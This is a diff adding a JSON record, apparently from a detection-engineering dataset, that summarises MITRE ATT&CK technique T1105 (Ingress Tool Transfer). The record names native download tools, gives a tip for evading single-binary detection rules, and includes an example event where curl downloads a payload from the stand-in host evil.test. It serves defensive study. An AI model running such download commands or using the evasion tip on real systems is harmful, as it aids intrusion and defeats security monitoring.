@@ -1,0 +1,17 @@
+{
+  "id": "attack-t1105-ingress-tool-transfer",
+  "partition": "red",
+  "title": "Ingress Tool Transfer (T1105)",
+  "source": "MITRE ATT&CK",
+  "provenance": "representative summary of attack.mitre.org T1105",
+  "source_url": "https://attack.mitre.org/techniques/T1105/",
+  "techniques": ["T1105"],
+  "tactic": "Command and Control",
+  "text": "Adversaries transfer tools or other files from an external system into a compromised environment. Files may be copied in over C2, or pulled down with native utilities (certutil, bitsadmin, curl, powershell Invoke-WebRequest) to live off the land. Evasion angle for detections: attackers switch between multiple download utilities, so a rule that names only one LOLBin (e.g. only certutil) is bypassed by using an alternate binary that produces the same ingress behavior.",
+  "example_event": {
+    "Image": "C:\\Windows\\System32\\curl.exe",
+    "OriginalFileName": "curl.exe",
+    "CommandLine": "curl.exe -o C:\\Temp\\p.exe http://evil.test/payload.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+  }
+}
